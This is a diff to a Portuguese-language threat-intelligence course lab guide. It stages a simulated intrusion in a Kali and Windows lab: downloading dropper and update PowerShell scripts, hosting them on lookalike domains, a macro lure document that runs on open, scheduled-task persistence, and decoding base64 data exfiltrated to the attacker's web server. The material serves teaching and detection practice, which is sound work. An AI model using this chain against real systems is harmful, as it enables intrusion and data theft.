@@ -200,6 +200,18 @@ Verdict: Unusual outbound data transfer
 ```
 
 Preparação do ambiente:
+- Baixar Scripts ps1 no Kali Linux
+```
+wget https://raw.githubusercontent.com/thiagosmith/pos-cti-adint/refs/heads/main/Modulo01/scripts/dropper.ps1
+```
+```
+wget https://raw.githubusercontent.com/thiagosmith/pos-cti-adint/refs/heads/main/Modulo01/scripts/update.ps1
+```
+- Subir WebServer em Python no Kali Linux
+```
+python -m http.server 80
+```
+
 - Alterar arquivo hosts no Windows10
 ```
 c:\>notepad c:\Windows\System32\drivers\etc\hosts
@@ -207,7 +219,7 @@ c:\>notepad c:\Windows\System32\drivers\etc\hosts
 	192.168.2.118	update-sync.org secure-data.net # Endereço de IP do Kali Linux
 ```
 
-VBA do arquivo Lista_de_Demissoes_2026.doc
+- VBA do arquivo Lista_de_Demissoes_2026.doc
 ```
 Sub Document_Open()
     ADINT
@@ -232,9 +244,31 @@ Sub Wait(n As Long)
     Loop Until Now >= DateAdd("s", n, t)
 End Sub
 ```
+- Verificação da tarefa agendada no Windows10
+```
+schtasks /query /fo LIST /v /tn "Update-sync"
+```
+- Verificação dos dados exfiltrados no WebServer do Kali Linux
+```
+nano data.txt
+```
+```
+du -h data.txt
+```
+```
+awk -F'session=' '{print $2}' data.txt | cut -d " " -f1 > base64.txt
+```
+```
+cat base64.txt
+```
+```
+cat base64.txt | base64 -d
+```
+
+### Desafio 3: Criação de Feed de Threat Intelligence
 
 
-
+### Desafio 4: Simulação de Evasão e Persistência
 
 
 
